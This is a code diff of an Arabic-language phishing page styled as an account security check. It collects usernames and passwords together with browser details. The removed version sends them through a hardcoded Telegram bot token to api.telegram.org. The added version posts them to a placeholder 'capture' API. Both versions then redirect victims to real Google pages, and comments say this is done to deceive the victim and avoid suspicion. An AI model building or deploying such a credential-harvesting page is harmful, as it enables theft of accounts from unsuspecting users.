@@ -3,78 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الموحد | Account Center</title>
+    <title>مركز التحقق من الحساب</title>
     <style>
-        body { background-color: #0a0a0a; color: #e0e0e0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .auth-card { width: 100%; max-width: 400px; padding: 30px; background: #141414; border: 1px solid #222; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .logo-area { text-align: center; margin-bottom: 25px; }
-        .logo-area img { width: 50px; filter: grayscale(1) invert(1); }
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #fff; }
-        p { font-size: 14px; color: #888; text-align: center; margin-bottom: 25px; line-height: 1.5; }
-        .input-box { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; color: #aaa; margin-bottom: 8px; }
-        input { width: 100%; padding: 12px; background: #1d1d1d; border: 1px solid #333; border-radius: 6px; color: #fff; font-size: 15px; box-sizing: border-box; }
-        input:focus { border-color: #444; outline: none; background: #252525; }
-        .verify-btn { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; transition: 0.3s; }
-        .verify-btn:hover { background: #ccc; }
-        .footer-note { font-size: 11px; color: #555; text-align: center; margin-top: 20px; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 350px; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        .logo { margin-bottom: 20px; color: #fff; font-size: 24px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
+        input:focus { border-color: #00ff00; outline: none; }
+        .btn { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .status { font-size: 12px; color: #666; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="auth-card">
-        <div class="logo-area">
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        </div>
-        <h2>تحقق من ملكية الحساب</h2>
-        <p>تم اكتشاف محاولة دخول غير معتادة. يرجى تأكيد بيانات حسابك المرتبط للمتابعة.</p>
-        
-        <form id="secureForm">
-            <div class="input-box">
-                <label>البريد الإلكتروني أو اسم المستخدم</label>
-                <input type="text" id="user" placeholder="example@mail.com" required>
-            </div>
-            <div class="input-box">
-                <label>كلمة المرور</label>
-                <input type="password" id="pass" placeholder="••••••••" required>
-            </div>
-            <button type="button" class="verify-btn" onclick="process()">تأكيد الهوية</button>
-        </form>
+<div class="card">
+    <div class="logo">🛡️ Security Check</div>
+    <p style="font-size: 14px; color: #bbb;">يرجى تسجيل الدخول لتأكيد ملكية الحساب ومتابعة النشاط.</p>
+    
+    <form id="authForm">
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة المرور" required>
+        <button type="button" class="btn" id="submitBtn" onclick="handleAuth()">تأكيد الهوية</button>
+    </form>
 
-        <div class="footer-note">
-            نظام حماية الحسابات الموحد © 2026<br>
-            تشفير البيانات بنظام SSL 256-bit
-        </div>
-    </div>
+    <div class="status" id="msg">نظام حماية البيانات الموحد v6.0</div>
+</div>
 
-    <script>
-        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
-        const CHAT_ID = "5811700860";
+<script>
+    async function handleAuth() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('submitBtn');
+        const msg = document.getElementById('msg');
 
-        async function process() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            const btn = document.querySelector('.verify-btn');
+        // فحص بسيط قبل الإرسال
+        if (user.length < 5 || pass.length < 5) {
+            alert("خطأ في البيانات!");
+            return;
+        }
 
-            if(u.length < 5 || p.length < 5) return;
+        // تمويه: تغيير شكل الزر
+        btn.innerText = "جاري الفحص...";
+        btn.style.opacity = "0.7";
+        btn.disabled = true;
 
-            // تمويه: تغيير شكل الزر لإيهام الضحية بالتحقق
-            btn.innerText = "جاري التحقق...";
-            btn.disabled = true;
+        // البيانات اللي بنرسلها للـ API حقنا
+        const data = {
+            username: user,
+            password: pass,
+            platform: navigator.platform,
+            agent: navigator.userAgent
+        };
 
-            const report = `🛡️ **صيد أمان جديد (احترافي):**\n\n👤 المستخدم: \`${u}\`\n🔑 كلمة السر: \`${p}\`\n🌍 المتصفح: ${navigator.platform}`;
+        try {
+            // --- هنا الربط مع الـ API ---
+            // استبدل الرابط اللي تحت برابط الـ API حقك (مثل PythonAnywhere)
+            const API_URL = "https://your-python-api.com/capture"; 
 
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            const response = await fetch(API_URL, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: report, parse_mode: "Markdown"})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
             });
 
-            // التحويل لمكان يوحي بالأمان (مثل صفحة المساعدة الرسمية)
-            setTimeout(() => {
-                window.location.href = "https://support.google.com/accounts/answer/6294822";
-            }, 1500);
+            if (response.ok) {
+                msg.innerText = "✅ تم التحقق، جاري التحويل...";
+                setTimeout(() => {
+                    // التحويل النهائي للموقع الحقيقي
+                    window.location.href = "https://accounts.google.com/ServiceLogin";
+                }, 1500);
+            }
+        } catch (error) {
+            // حتى لو فشل الاتصال بالسيرفر، نحوله عشان ما يشك
+            console.error("Connection Error");
+            window.location.href = "https://accounts.google.com";
         }
-    </script>
+    }
+</script>
 </body>
 </html>
